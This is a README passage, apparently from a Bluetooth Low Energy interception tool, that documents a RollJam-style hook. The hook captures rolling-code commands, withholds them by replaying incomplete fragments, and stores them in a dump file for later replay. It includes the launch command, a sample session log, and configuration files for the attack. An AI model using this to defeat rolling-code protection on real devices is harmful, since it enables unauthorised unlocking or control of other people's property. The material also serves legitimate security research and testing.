Example hook functions.

## RollJam hooking helper

Some devices use special commands that couldn't be understand without knowing their secrets, but also make the use of some kind of rolling code mecanisms to prevent against replaying attacks.

To play with rolling code attacks in BLE, as it's the case for RollJam attack against remote controls using rolling code, a generic scripts hooking helper ``rolljam.js`` has been provided here.

To use it, you can launch the ``advertise.js`` script as follows with the ``-w`` command after configuring the devices characteristics, and configuring also the ``RollJam.js`` commands configuration files:

```bash
# node advertise.js -a devices/********ba6d_********BA6D-.adv.json -s devices/*******ba6d.srv.json -w rolljam.js 
[...]
 <<<<<<<<<<<<<<<< INITIALIZED >>>>>>>>>>>>>>>>>>>> 
Client connected: **:**:**:**:ce:78
>> Subscribe: **f0 -> **f2
>> Subscribe: **f0 -> **f3
>> Write:  **f0 -> **f1 : 3984****************************8ccd
[RollJam] Keeping 1st cmd key part 1: 3984****************************8ccd
[RollJam] Playing incomplete cmd: 3984
   ******ba6d:**f0 confirmed subscription state: **f2
   ******ba6d:**f0 confirmed subscription state: **f2
[...]
>> Write:  **f0 -> **f1 : 25***********************************2e
[RollJam] Keeping 1st cmd key part 2: 25***********************************2e
[RollJam] Playing incomplete cmd: 25
[...]
[RollJam] Keeping 2nd cmd key part 2: 25***************************ed
[RollJam] Playing 1st cmd key instead, part 2: 25******************************2e
Client disconnected: **:**:**:**:ce:78
```

To add the hook, please add the following lines in the characteristics you want to interact with:

```bash
{
        "uuid": "**f0",
        "characteristics": [
            {
                "uuid": "**f1",
                "properties": [
                    "read",
                    "write"
                ],
                "value": "0000000000000000000000000000000000000000",
                "descriptors": [
                    {
			[...]
                    }
                ],
                "hooks": {
                    "dynamicWrite": "RollJamWrite"
                },

```

To configure the command to hook, you can edit the ``RollJam.json`` in the ``hookFunctions`` directory as follows:

```bash
{ "commands" : 
	{ "3984" : { # substring of the command
			"to" : "3984", # to replace with this command (exemple with imcomplete command)
			"number" : 1 # command part 1
	},
	  "25" : {
	  		"to" : "25",
			"number" : 2 # command part 2
	  }
	}
}
```

The ``number`` field is an index of the command part/fragmentation number.

The 2nd session commands are kept in the ``dump/<device mac>.rolljam`` file as follows:

```bash
# cat dump/*********ba6d.rolljam 
2018.07.09 10:49:52.052 | < W | **f0 | **f1 | 39***********************************be
2018.07.09 10:49:53.514 | < W | **f0 | **f1 | 25***********************************56
```

And could be replayed after with GATTacker, or readapted for nRF connect with ``gattacker2nrf.js`` to kept them as macros in the application to be replayed also.
